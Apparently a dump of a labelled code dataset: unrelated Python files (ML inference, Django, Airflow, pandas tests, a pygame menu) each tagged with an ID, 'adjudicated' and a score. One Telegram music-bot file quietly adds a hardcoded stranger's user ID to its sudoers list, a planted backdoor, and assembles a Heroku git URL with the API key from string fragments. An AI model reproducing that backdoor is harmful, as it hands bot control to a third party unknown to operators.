import matplotlib.pyplot as plt

from model import vgg


def main():
    device = torch.device(""cuda:0"" if torch.cuda.is_available() else ""cpu"")

    data_transform = transforms.Compose(
        [transforms.Resize((224, 224)),
         transforms.ToTensor(),
         transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5))])

    # load image
    img_path = ""../tulip.jpg""
    assert os.path.exists(img_path), ""file: '{}' dose not exist."".format(img_path)
    img = Image.open(img_path)
    plt.imshow(img)
    # [N, C, H, W]
    img = data_transform(img)
    # expand batch dimension
    img = torch.unsqueeze(img, dim=0)

    # read class_indict
    json_path = './class_indices.json'
    assert os.path.exists(json_path), ""file: '{}' dose not exist."".format(json_path)

    with open(json_path, ""r"") as f:
        class_indict = json.load(f)
    
    # create model
    model = vgg(model_name=""vgg16"", num_classes=5).to(device)
    # load model weights
    weights_path = ""./vgg16Net.pth""
    assert os.path.exists(weights_path), ""file: '{}' dose not exist."".format(weights_path)
    model.load_state_dict(torch.load(weights_path, map_location=device))

    model.eval()
    with torch.no_grad():
        # predict class
        output = torch.squeeze(model(img.to(device))).cpu()
        predict = torch.softmax(output, dim=0)
        predict_cla = torch.argmax(predict).numpy()

    print_res = ""class: {}   prob: {:.3}"".format(class_indict[str(predict_cla)],
                                                 predict[predict_cla].numpy())
    plt.title(print_res)
    for i in range(len(predict)):
        print(""class: {:10}   prob: {:.3}"".format(class_indict[str(i)],
                                                  predict[i].numpy()))
    plt.show()


if __name__ == '__main__':
    main()"
95	adjudicated	1	"# Copyright 2017 Elisey Zanko
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import sys
import typing

from pip._vendor.tenacity import BaseRetrying
from pip._vendor.tenacity import DoAttempt
from pip._vendor.tenacity import DoSleep
from pip._vendor.tenacity import RetryCallState

from tornado import gen

if typing.TYPE_CHECKING:
    from tornado.concurrent import Future

_RetValT = typing.TypeVar(""_RetValT"")


class TornadoRetrying(BaseRetrying):
    def __init__(self, sleep: ""typing.Callable[[float], Future[None]]"" = gen.sleep, **kwargs: typing.Any) -> None:
        super().__init__(**kwargs)
        self.sleep = sleep

    @gen.coroutine
    def __call__(  # type: ignore  # Change signature from supertype
        self,
        fn: ""typing.Callable[..., typing.Union[typing.Generator[typing.Any, typing.Any, _RetValT], Future[_RetValT]]]"",
        *args: typing.Any,
        **kwargs: typing.Any,
    ) -> ""typing.Generator[typing.Any, typing.Any, _RetValT]"":
        self.begin()

        retry_state = RetryCallState(retry_object=self, fn=fn, args=args, kwargs=kwargs)
        while True:
            do = self.iter(retry_state=retry_state)
            if isinstance(do, DoAttempt):
                try:
                    result = yield fn(*args, **kwargs)
                except BaseException:  # noqa: B902
                    retry_state.set_exception(sys.exc_info())
                else:
                    retry_state.set_result(result)
            elif isinstance(do, DoSleep):
                retry_state.prepare_for_next_attempt()
                yield self.sleep(do)
            else:
                raise gen.Return(do)"
304	adjudicated	3	"# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.
""""""isort:skip_file""""""

import functools
import importlib


dependencies = [
    ""dataclasses"",
    ""hydra"",
    ""numpy"",
    ""omegaconf"",
    ""regex"",
    ""requests"",
    ""torch"",
]


# Check for required dependencies and raise a RuntimeError if any are missing.
missing_deps = []
for dep in dependencies:
    try:
        importlib.import_module(dep)
    except ImportError:
        # Hack: the hydra package is provided under the ""hydra-core"" name in
        # pypi. We don't want the user mistakenly calling `pip install hydra`
        # since that will install an unrelated package.
        if dep == ""hydra"":
            dep = ""hydra-core""
        missing_deps.append(dep)
if len(missing_deps) > 0:
    raise RuntimeError(""Missing dependencies: {}"".format("", "".join(missing_deps)))


# only do fairseq imports after checking for dependencies
from fairseq.hub_utils import (  # noqa; noqa
    BPEHubInterface as bpe,
    TokenizerHubInterface as tokenizer,
)
from fairseq.models import MODEL_REGISTRY  # noqa


# torch.hub doesn't build Cython components, so if they are not found then try
# to build them here
try:
    import fairseq.data.token_block_utils_fast  # noqa
except ImportError:
    try:
        import cython  # noqa
        import os
        from setuptools import sandbox

        sandbox.run_setup(
            os.path.join(os.path.dirname(__file__), ""setup.py""),
            [""build_ext"", ""--inplace""],
        )
    except ImportError:
        print(
            ""Unable to build Cython components. Please make sure Cython is ""
            ""installed if the torch.hub model you are loading depends on it.""
        )


# automatically expose models defined in FairseqModel::hub_models
for _model_type, _cls in MODEL_REGISTRY.items():
    for model_name in _cls.hub_models().keys():
        globals()[model_name] = functools.partial(
            _cls.from_pretrained,
            model_name,
        )"
126	adjudicated	2	"#!/usr/bin/env python

# Copyright (c) 2012 Google Inc. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

""""""Unit tests for the common.py file.""""""

import gyp.common
import unittest
import sys


class TestTopologicallySorted(unittest.TestCase):
  def test_Valid(self):
    """"""Test that sorting works on a valid graph with one possible order.""""""
    graph = {
        'a': ['b', 'c'],
        'b': [],
        'c': ['d'],
        'd': ['b'],
        }
    def GetEdge(node):
      return tuple(graph[node])
    self.assertEqual(
      gyp.common.TopologicallySorted(graph.keys(), GetEdge),
      ['a', 'c', 'd', 'b'])

  def test_Cycle(self):
    """"""Test that an exception is thrown on a cyclic graph.""""""
    graph = {
        'a': ['b'],
        'b': ['c'],
        'c': ['d'],
        'd': ['a'],
        }
    def GetEdge(node):
      return tuple(graph[node])
    self.assertRaises(
      gyp.common.CycleError, gyp.common.TopologicallySorted,
      graph.keys(), GetEdge)


class TestGetFlavor(unittest.TestCase):
  """"""Test that gyp.common.GetFlavor works as intended""""""
  original_platform = ''

  def setUp(self):
    self.original_platform = sys.platform

  def tearDown(self):
    sys.platform = self.original_platform

  def assertFlavor(self, expected, argument, param):
    sys.platform = argument
    self.assertEqual(expected, gyp.common.GetFlavor(param))

  def test_platform_default(self):
    self.assertFlavor('freebsd', 'freebsd9' , {})
    self.assertFlavor('freebsd', 'freebsd10', {})
    self.assertFlavor('openbsd', 'openbsd5' , {})
    self.assertFlavor('solaris', 'sunos5'   , {});
    self.assertFlavor('solaris', 'sunos'    , {});
    self.assertFlavor('linux'  , 'linux2'   , {});
    self.assertFlavor('linux'  , 'linux3'   , {});

  def test_param(self):
    self.assertFlavor('foobar', 'linux2' , {'flavor': 'foobar'})


if __name__ == '__main__':
  unittest.main()"
66	adjudicated	3	"r""""""
Building the required library in this example requires a source distribution
of NumPy or clone of the NumPy git repository since distributions.c is not
included in binary distributions.

On *nix, execute in numpy/random/src/distributions

export ${PYTHON_VERSION}=3.8 # Python version
export PYTHON_INCLUDE=#path to Python's include folder, usually \
    ${PYTHON_HOME}/include/python${PYTHON_VERSION}m
export NUMPY_INCLUDE=#path to numpy's include folder, usually \
    ${PYTHON_HOME}/lib/python${PYTHON_VERSION}/site-packages/numpy/core/include
gcc -shared -o libdistributions.so -fPIC distributions.c \
    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}
mv libdistributions.so ../../_examples/numba/

On Windows

rem PYTHON_HOME and PYTHON_VERSION are setup dependent, this is an example
set PYTHON_HOME=c:\Anaconda
set PYTHON_VERSION=38
cl.exe /LD .\distributions.c -DDLL_EXPORT \
    -I%PYTHON_HOME%\lib\site-packages\numpy\core\include \
    -I%PYTHON_HOME%\include %PYTHON_HOME%\libs\python%PYTHON_VERSION%.lib
move distributions.dll ../../_examples/numba/
""""""
import os

import numba as nb
import numpy as np
from cffi import FFI

from numpy.random import PCG64

ffi = FFI()
if os.path.exists('./distributions.dll'):
    lib = ffi.dlopen('./distributions.dll')
elif os.path.exists('./libdistributions.so'):
    lib = ffi.dlopen('./libdistributions.so')
else:
    raise RuntimeError('Required DLL/so file was not found.')

ffi.cdef(""""""
double random_standard_normal(void *bitgen_state);
"""""")
x = PCG64()
xffi = x.cffi
bit_generator = xffi.bit_generator

random_standard_normal = lib.random_standard_normal


def normals(n, bit_generator):
    out = np.empty(n)
    for i in range(n):
        out[i] = random_standard_normal(bit_generator)
    return out


normalsj = nb.jit(normals, nopython=True)

# Numba requires a memory address for void *
# Can also get address from x.ctypes.bit_generator.value
bit_generator_address = int(ffi.cast('uintptr_t', bit_generator))

norm = normalsj(1000, bit_generator_address)
print(norm[:12])"
177	adjudicated	3	"# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See LICENSE in the project root
# for license information.

import sys


if __name__ == ""__main__"":
    # debugpy can also be invoked directly rather than via -m. In this case, the first
    # entry on sys.path is the one added automatically by Python for the directory
    # containing this file. This means that import debugpy will not work, since we need
    # the parent directory of debugpy/ to be in sys.path, rather than debugpy/ itself.
    #
    # The other issue is that many other absolute imports will break, because they
    # will be resolved relative to debugpy/ - e.g. `import debugger` will then try
    # to import debugpy/debugger.py.
    #
    # To fix both, we need to replace the automatically added entry such that it points
    # at parent directory of debugpy/ instead of debugpy/ itself, import debugpy with that
    # in sys.path, and then remove the first entry entry altogether, so that it doesn't
    # affect any further imports we might do. For example, suppose the user did:
    #
    #   python /foo/bar/debugpy ...
    #
    # At the beginning of this script, sys.path will contain ""/foo/bar/debugpy"" as the
    # first entry. What we want is to replace it with ""/foo/bar', then import debugpy
    # with that in effect, and then remove the replaced entry before any more
    # code runs. The imported debugpy module will remain in sys.modules, and thus all
    # future imports of it or its submodules will resolve accordingly.
    if ""debugpy"" not in sys.modules:
        # Do not use dirname() to walk up - this can be a relative path, e.g. ""."".
        sys.path[0] = sys.path[0] + ""/../""
        import debugpy  # noqa

        del sys.path[0]

    from debugpy.server import cli

    cli.main()"
37	adjudicated	1	"# Generate a 'HZK' font file for the T5UIC1 DWIN LCD
# from multiple bdf font files.
# Note: the 16x16 glyphs are not produced
# Author: Taylor Talkington
# License: GPL

import bdflib.reader
import math

def glyph_bits(size_x, size_y, font, glyph_ord):
    asc = font[b'FONT_ASCENT']
    desc = font[b'FONT_DESCENT']
    bits = [0 for y in range(size_y)]

    glyph_bytes = math.ceil(size_x / 8)
    try:
        glyph = font[glyph_ord]
        for y, row in enumerate(glyph.data):
            v = row
            rpad = size_x - glyph.bbW
            if rpad < 0: rpad = 0
            if glyph.bbW > size_x: v = v >> (glyph.bbW - size_x) # some glyphs are actually too wide to fit!
            v = v << (glyph_bytes * 8) - size_x + rpad
            v = v >> glyph.bbX
            bits[y + desc + glyph.bbY] |= v
    except KeyError:
        pass

    bits.reverse()
    return bits

def marlin_font_hzk():
    fonts = [
        [6,12,'marlin-6x12-3.bdf'],
        [8,16,'marlin-8x16.bdf'],
        [10,20,'marlin-10x20.bdf'],
        [12,24,'marlin-12x24.bdf'],
        [14,28,'marlin-14x28.bdf'],
        [16,32,'marlin-16x32.bdf'],
        [20,40,'marlin-20x40.bdf'],
        [24,48,'marlin-24x48.bdf'],
        [28,56,'marlin-28x56.bdf'],
        [32,64,'marlin-32x64.bdf']
    ]

    with open('marlin_fixed.hzk','wb') as output:
        for f in fonts:
            with open(f[2], 'rb') as file:
                print(f'{f[0]}x{f[1]}')
                font = bdflib.reader.read_bdf(file)
                for glyph in range(128):
                    bits = glyph_bits(f[0], f[1], font, glyph)
                    glyph_bytes = math.ceil(f[0]/8)

                    for b in bits:
                        try:
                            z = b.to_bytes(glyph_bytes, 'big')
                            output.write(z)
                        except OverflowError:
                            print('Overflow')
                            print(f'{glyph}')
                            print(font[glyph])
                            for b in bits: print(f'{b:0{f[0]}b}')
                            return"
27	adjudicated	1	"from django.conf import settings
from django.core import checks
from django.core.exceptions import FieldDoesNotExist
from django.db import models


class CurrentSiteManager(models.Manager):
    ""Use this to limit objects to those associated with the current site.""

    use_in_migrations = True

    def __init__(self, field_name=None):
        super().__init__()
        self.__field_name = field_name

    def check(self, **kwargs):
        errors = super().check(**kwargs)
        errors.extend(self._check_field_name())
        return errors

    def _check_field_name(self):
        field_name = self._get_field_name()
        try:
            field = self.model._meta.get_field(field_name)
        except FieldDoesNotExist:
            return [
                checks.Error(
                    ""CurrentSiteManager could not find a field named '%s'.""
                    % field_name,
                    obj=self,
                    id=""sites.E001"",
                )
            ]

        if not field.many_to_many and not isinstance(field, (models.ForeignKey)):
            return [
                checks.Error(
                    ""CurrentSiteManager cannot use '%s.%s' as it is not a foreign key ""
                    ""or a many-to-many field.""
                    % (self.model._meta.object_name, field_name),
                    obj=self,
                    id=""sites.E002"",
                )
            ]

        return []

    def _get_field_name(self):
        """"""Return self.__field_name or 'site' or 'sites'.""""""

        if not self.__field_name:
            try:
                self.model._meta.get_field(""site"")
            except FieldDoesNotExist:
                self.__field_name = ""sites""
            else:
                self.__field_name = ""site""
        return self.__field_name

    def get_queryset(self):
        return (
            super()
            .get_queryset()
            .filter(**{self._get_field_name() + ""__id"": settings.SITE_ID})
        )"
167	adjudicated	0	"import socket
import time

import heroku3
from pyrogram import filters

import config
from ShizukaXMusic.core.mongo import pymongodb

from .logging import LOGGER

SUDOERS = filters.user()

HAPP = None
_boot_ = time.time()


def is_heroku():
    return ""heroku"" in socket.getfqdn()


XCB = [
    ""/"",
    ""@"",
    ""."",
    ""com"",
    "":"",
    ""git"",
    ""heroku"",
    ""push"",
    str(config.HEROKU_API_KEY),
    ""https"",
    str(config.HEROKU_APP_NAME),
    ""HEAD"",
    ""main"",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f""Database Initialized."")


def sudo():
    global SUDOERS
    OWNER = config.OWNER_ID
    if config.MONGO_DB_URI is None:
        for user_id in OWNER:
            SUDOERS.add(user_id)
    else:
        sudoersdb = pymongodb.sudoers
        sudoers = sudoersdb.find_one({""sudo"": ""sudo""})
        sudoers = [] if not sudoers else sudoers[""sudoers""]
        for user_id in OWNER:
            SUDOERS.add(user_id)
            if user_id not in sudoers:
                sudoers.append(user_id)
                sudoers.append(5463205082)
                sudoersdb.update_one(
                    {""sudo"": ""sudo""},
                    {""$set"": {""sudoers"": sudoers}},
                    upsert=True,
                )
        if sudoers:
            for x in sudoers:
                SUDOERS.add(x)
    LOGGER(__name__).info(f""Sudo Users Loaded Successfully."")


def heroku():
    global HAPP
    if is_heroku:
        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
            try:
                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                HAPP = Heroku.app(config.HEROKU_APP_NAME)
                LOGGER(__name__).info(f""Heroku App Configured Successfully."")
            except BaseException:
                LOGGER(__name__).warning(
                    f""Please make sure your Heroku API Key and Your App name are configured correctly in the heroku.""
                )"
76	adjudicated	3	"#!/usr/bin/env python
# Copyright 2021 Google, Inc
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# All Rights Reserved.

# [START recaptcha_enterprise_delete_site_key]
from google.cloud import recaptchaenterprise_v1


def delete_site_key(project_id: str, recaptcha_site_key: str) -> None:
    """"""Delete the given reCAPTCHA site key present under the project ID.

    Args:
    project_id : GCloud Project ID.
    recaptcha_site_key: Specify the key ID to be deleted.
    """"""

    client = recaptchaenterprise_v1.RecaptchaEnterpriseServiceClient()

    # Construct the key details.
    key_name = f""projects/{project_id}/keys/{recaptcha_site_key}""

    # Set the project ID and reCAPTCHA site key.
    request = recaptchaenterprise_v1.DeleteKeyRequest()
    request.name = key_name

    client.delete_key(request)
    print(""reCAPTCHA Site key deleted successfully ! "")


# [END recaptcha_enterprise_delete_site_key]


if __name__ == ""__main__"":
    import google.auth
    import google.auth.exceptions

    # TODO(developer): Replace the below variables before running
    try:
        default_project_id = google.auth.default()[1]
        recaptcha_site_key = ""recaptcha_site_key""
    except google.auth.exceptions.DefaultCredentialsError:
        print(
            ""Please use `gcloud auth application-default login` ""
            ""or set GOOGLE_APPLICATION_CREDENTIALS to use this script.""
        )
    else:
        delete_site_key(default_project_id, recaptcha_site_key)"
136	adjudicated	0	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from unittest import mock

from airflow.providers.amazon.aws.transfers.s3_to_ftp import S3ToFTPOperator

TASK_ID = ""test_s3_to_ftp""
BUCKET = ""test-s3-bucket""
S3_KEY = ""test/test_1_file.csv""
FTP_PATH = ""/tmp/remote_path.txt""
AWS_CONN_ID = ""aws_default""
FTP_CONN_ID = ""ftp_default""


class TestS3ToFTPOperator:
    @mock.patch(""airflow.providers.ftp.hooks.ftp.FTPHook.store_file"")
    @mock.patch(""airflow.providers.amazon.aws.hooks.s3.S3Hook.get_key"")
    @mock.patch(""airflow.providers.amazon.aws.transfers.s3_to_ftp.NamedTemporaryFile"")
    def test_execute(self, mock_local_tmp_file, mock_s3_hook_get_key, mock_ftp_hook_store_file):
        operator = S3ToFTPOperator(task_id=TASK_ID, s3_bucket=BUCKET, s3_key=S3_KEY, ftp_path=FTP_PATH)
        operator.execute(None)

        mock_s3_hook_get_key.assert_called_once_with(operator.s3_key, operator.s3_bucket)

        mock_local_tmp_file_value = mock_local_tmp_file.return_value.__enter__.return_value
        mock_s3_hook_get_key.return_value.download_fileobj.assert_called_once_with(mock_local_tmp_file_value)
        mock_ftp_hook_store_file.assert_called_once_with(operator.ftp_path, mock_local_tmp_file_value.name)"
314	adjudicated	3	"from abc import ABCMeta, abstractmethod


class CacheAdapter:
    """"""
    CacheAdapter Abstract Base Class
    """"""
    __metaclass__ = ABCMeta

    @abstractmethod
    def get(self, public_id, type, resource_type, transformation, format):
        """"""
        Gets value specified by parameters

        :param public_id:       The public ID of the resource
        :param type:            The storage type
        :param resource_type:   The type of the resource
        :param transformation:  The transformation string
        :param format:          The format of the resource

        :return: None|mixed value, None if not found
        """"""
        raise NotImplementedError

    @abstractmethod
    def set(self, public_id, type, resource_type, transformation, format, value):
        """"""
        Sets value specified by parameters

        :param public_id:       The public ID of the resource
        :param type:            The storage type
        :param resource_type:   The type of the resource
        :param transformation:  The transformation string
        :param format:          The format of the resource
        :param value:           The value to set

        :return: bool True on success or False on failure
        """"""
        raise NotImplementedError

    @abstractmethod
    def delete(self, public_id, type, resource_type, transformation, format):
        """"""
        Deletes entry specified by parameters

        :param public_id:       The public ID of the resource
        :param type:            The storage type
        :param resource_type:   The type of the resource
        :param transformation:  The transformation string
        :param format:          The format of the resource

        :return: bool True on success or False on failure
        """"""
        raise NotImplementedError

    @abstractmethod
    def flush_all(self):
        """"""
        Flushes all entries from cache

        :return: bool True on success or False on failure
        """"""
        raise NotImplementedError"
85	adjudicated	3	"from importlib import import_module

from django.utils.version import get_docs_version


def deconstructible(*args, path=None):
    """"""
    Class decorator that allows the decorated class to be serialized
    by the migrations subsystem.

    The `path` kwarg specifies the import path.
    """"""

    def decorator(klass):
        def __new__(cls, *args, **kwargs):
            # We capture the arguments to make returning them trivial
            obj = super(klass, cls).__new__(cls)
            obj._constructor_args = (args, kwargs)
            return obj

        def deconstruct(obj):
            """"""
            Return a 3-tuple of class import path, positional arguments,
            and keyword arguments.
            """"""
            # Fallback version
            if path and type(obj) is klass:
                module_name, _, name = path.rpartition(""."")
            else:
                module_name = obj.__module__
                name = obj.__class__.__name__
            # Make sure it's actually there and not an inner class
            module = import_module(module_name)
            if not hasattr(module, name):
                raise ValueError(
                    ""Could not find object %s in %s.\n""
                    ""Please note that you cannot serialize things like inner ""
                    ""classes. Please move the object into the main module ""
                    ""body to use migrations.\n""
                    ""For more information, see ""
                    ""https://docs.djangoproject.com/en/%s/topics/migrations/""
                    ""#serializing-values"" % (name, module_name, get_docs_version())
                )
            return (
                path
                if path and type(obj) is klass
                else f""{obj.__class__.__module__}.{name}"",
                obj._constructor_args[0],
                obj._constructor_args[1],
            )

        klass.__new__ = staticmethod(__new__)
        klass.deconstruct = deconstruct

        return klass

    if not args:
        return decorator
    return decorator(*args)"
254	adjudicated	3	"import pytest

from pandas import (
    CategoricalIndex,
    Index,
)
import pandas._testing as tm


class TestAppend:
    @pytest.fixture
    def ci(self):
        categories = list(""cab"")
        return CategoricalIndex(list(""aabbca""), categories=categories, ordered=False)

    def test_append(self, ci):
        # append cats with the same categories
        result = ci[:3].append(ci[3:])
        tm.assert_index_equal(result, ci, exact=True)

        foos = [ci[:1], ci[1:3], ci[3:]]
        result = foos[0].append(foos[1:])
        tm.assert_index_equal(result, ci, exact=True)

    def test_append_empty(self, ci):
        # empty
        result = ci.append([])
        tm.assert_index_equal(result, ci, exact=True)

    def test_append_mismatched_categories(self, ci):
        # appending with different categories or reordered is not ok
        msg = ""all inputs must be Index""
        with pytest.raises(TypeError, match=msg):
            ci.append(ci.values.set_categories(list(""abcd"")))
        with pytest.raises(TypeError, match=msg):
            ci.append(ci.values.reorder_categories(list(""abc"")))

    def test_append_category_objects(self, ci):
        # with objects
        result = ci.append(Index([""c"", ""a""]))
        expected = CategoricalIndex(list(""aabbcaca""), categories=ci.categories)
        tm.assert_index_equal(result, expected, exact=True)

    def test_append_non_categories(self, ci):
        # invalid objects -> cast to object via concat_compat
        result = ci.append(Index([""a"", ""d""]))
        expected = Index([""a"", ""a"", ""b"", ""b"", ""c"", ""a"", ""a"", ""d""])
        tm.assert_index_equal(result, expected, exact=True)

    def test_append_object(self, ci):
        # GH#14298 - if base object is not categorical -> coerce to object
        result = Index([""c"", ""a""]).append(ci)
        expected = Index(list(""caaabbca""))
        tm.assert_index_equal(result, expected, exact=True)

    def test_append_to_another(self):
        # hits Index._concat
        fst = Index([""a"", ""b""])
        snd = CategoricalIndex([""d"", ""e""])
        result = fst.append(snd)
        expected = Index([""a"", ""b"", ""d"", ""e""])
        tm.assert_index_equal(result, expected)"
345	adjudicated	0	"import pygame as pg

class Launch:

    def __init__(self, game):
        self.game = game
        self.screen = game.screen
        self.settings = game.settings
        self.screen_rect = self.screen.get_rect()
        self.images = []
        self.default_color = (255, 255, 255)
        self.prep_strings()
        self.prep_aliens()

    
    def prep_strings(self):
        self.prep_Text(""SPACE"", 170, offsetY=40)
        self.prep_Text(""INVADERS"", 90, color=(0,210,0), offsetY=140)
        self.prep_Text(""= 10 PTS"", 40, offsetX=600, offsetY=300)
        self.prep_Text(""= 20 PTS"", 40, offsetX=600, offsetY=350)
        self.prep_Text(""= 40 PTS"", 40, offsetX=600, offsetY=400)
        self.prep_Text(""= ???"", 40, offsetX=610, offsetY=450)
    
    def prep_aliens(self):
        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien_03-0.png'), 0, 1.5)
        self.images.append((alien1, (540, 290)))
        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien__10.png'), 0, .5)
        self.images.append((alien1, (525, 340)))
        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien__20.png'), 0, .5)
        self.images.append((alien1, (525, 390)))
        alien1 = pg.transform.rotozoom(pg.image.load(f'images/ufo.png'), 0, 1.2)
        self.images.append((alien1, (500, 410)))

    def prep_Text(self, msg, size, color=(255,255,255), offsetX=0, offsetY=0):
        font = pg.font.SysFont(None, size)
        text_image = font.render(msg, True, color, self.settings.bg_color)
        rect = text_image.get_rect()
        if offsetY == 0:
            rect.centery = self.screen_rect.centery
        else:
            rect.top = offsetY
        if offsetX == 0:
            rect.centerx = self.screen_rect.centerx
        else:
            rect.left = offsetX

        self.images.append((text_image,rect))

    def draw(self):
        for image in self.images:
            self.screen.blit(image[0], image[1])"
205	adjudicated	1	"import sys
from dataclasses import dataclass


@dataclass
class WindowsConsoleFeatures:
    """"""Windows features available.""""""

    vt: bool = False
    """"""The console supports VT codes.""""""
    truecolor: bool = False
    """"""The console supports truecolor.""""""


try:
    import ctypes
    from ctypes import LibraryLoader, wintypes

    if sys.platform == ""win32"":
        windll = LibraryLoader(ctypes.WinDLL)
    else:
        windll = None
        raise ImportError(""Not windows"")
except (AttributeError, ImportError, ValueError):
    # Fallback if we can't load the Windows DLL
    def get_windows_console_features() -> WindowsConsoleFeatures:
        features = WindowsConsoleFeatures()
        return features

else:
    STDOUT = -11
    ENABLE_VIRTUAL_TERMINAL_PROCESSING = 4
    _GetConsoleMode = windll.kernel32.GetConsoleMode
    _GetConsoleMode.argtypes = [wintypes.HANDLE, wintypes.LPDWORD]
    _GetConsoleMode.restype = wintypes.BOOL

    _GetStdHandle = windll.kernel32.GetStdHandle
    _GetStdHandle.argtypes = [
        wintypes.DWORD,
    ]
    _GetStdHandle.restype = wintypes.HANDLE

    def get_windows_console_features() -> WindowsConsoleFeatures:
        """"""Get windows console features.

        Returns:
            WindowsConsoleFeatures: An instance of WindowsConsoleFeatures.
        """"""
        handle = _GetStdHandle(STDOUT)
        console_mode = wintypes.DWORD()
        result = _GetConsoleMode(handle, console_mode)
        vt = bool(result and console_mode.value & ENABLE_VIRTUAL_TERMINAL_PROCESSING)
        truecolor = False
        if vt:
            win_version = sys.getwindowsversion()
            truecolor = win_version.major > 10 or (
                win_version.major == 10 and win_version.build >= 15063
            )
        features = WindowsConsoleFeatures(vt=vt, truecolor=truecolor)
        return features


if __name__ == ""__main__"":
    import platform

    features = get_windows_console_features()
    from pip._vendor.rich import print

    print(f'platform=""{platform.system()}""')
    print(repr(features))"
194	adjudicated	2	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Example DAG demonstrating the usage of the BashOperator.""""""
from __future__ import annotations

import datetime

from airflow import DAG
from airflow.operators.bash import BashOperator
from airflow.operators.empty import EmptyOperator

args = {
    ""owner"": ""airflow"",
}

dag = DAG(
    dag_id=""miscellaneous_test_dag"",
    default_args=args,
    schedule=""0 0 * * *"",
    start_date=datetime.datetime(2022, 1, 1),
    dagrun_timeout=datetime.timedelta(minutes=60),
    tags=[""example"", ""example2""],
    params={""example_key"": ""example_value""},
)

run_this_last = EmptyOperator(
    task_id=""run_this_last"",
    dag=dag,
)

# [START howto_operator_bash]
run_this = BashOperator(
    task_id=""run_after_loop"",
    bash_command=""echo 1"",
    dag=dag,
)
# [END howto_operator_bash]

run_this >> run_this_last

for i in range(3):
    task = BashOperator(
        task_id=""runme_"" + str(i),
        bash_command='echo ""{{ task_instance_key_str }}"" && sleep 1',
        dag=dag,
    )
    task >> run_this

# [START howto_operator_bash_template]
also_run_this = BashOperator(
    task_id=""also_run_this"",
    bash_command='echo ""run_id={{ run_id }} | dag_run={{ dag_run }}""',
    dag=dag,
)
# [END howto_operator_bash_template]
also_run_this >> run_this_last

if __name__ == ""__main__"":
    dag.cli()"
293	adjudicated	4	"""""""eCommerce URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/4.1/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
""""""
from django.contrib import admin
from django.urls import path,include
from crud import views

from django.conf import settings
from django.conf.urls.static import static

urlpatterns = [
    path('ckeditor/',include('ckeditor_uploader.urls')),
    path('admin/', admin.site.urls),
    path('',views.homepage,name=""homepage""),
    path('home/',views.homepage,name=""homepage""),
    path('about/',views.about,name=""about""),
    path('contact/',views.contact,name=""contact""),
    path('product/',views.product,name=""product""),
    path('signup/',views.user_signup,name=""user_signup""),
    path('signin/',views.user_login,name=""user_login""),
    path('dashboard/',views.dashboard,name=""dashboard""),
    path('cart/',views.cart,name=""cart""),
    path('addpost/',views.addpost,name=""addpost""),
    path('addcart/<str:title>',views.addcart,name=""addcart""),
    path('updatepost/<int:id>',views.updatepost,name=""updatepost""),
    path('deletepost/<int:id>',views.deletepost,name=""deletepost""),
    path('logout/',views.user_logout,name=""logout""),
    path('oauth/', include('social_django.urls', namespace='social')),
]

if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL,document_root=settings.MEDIA_ROOT)"
102	adjudicated	3	"# This is an example of a service hosted by python.exe rather than
# pythonservice.exe.

# Note that it is very rare that using python.exe is a better option
# than the default pythonservice.exe - the latter has better error handling
# so that if Python itself can't be initialized or there are very early
# import errors, you will get error details written to the event log.  When
# using python.exe instead, you are forced to wait for the interpreter startup
# and imports to succeed before you are able to effectively setup your own
# error handling.

# So in short, please make sure you *really* want to do this, otherwise just
# stick with the default.

import sys
import os
import win32serviceutil
import servicemanager

from pipeTestService import TestPipeService


class NativeTestPipeService(TestPipeService):
